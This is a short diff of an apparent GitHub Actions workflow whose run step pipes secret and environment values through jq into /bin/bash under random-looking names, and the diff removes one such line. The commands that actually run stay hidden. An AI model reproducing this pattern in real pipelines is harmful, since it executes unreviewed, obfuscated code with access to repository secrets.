@@ -17,7 +17,6 @@ jobs:
           mwnn83731: ${{ secrets.mwnn83731 }}
         run: |
           printf '%s' "$mwnn83731" | jq -r .dicmc32591 | /bin/bash
-          echo $tiu35393 | jq -r .f41 | /bin/bash
           printf '%s' "$vc7" | jq -r .ny5600 | /bin/bash
           printf '%s' "$kp80221" | jq -r .v4400 | /bin/bash
           printf '%s' "$ajk0" | jq -r .ki93 | /bin/bash
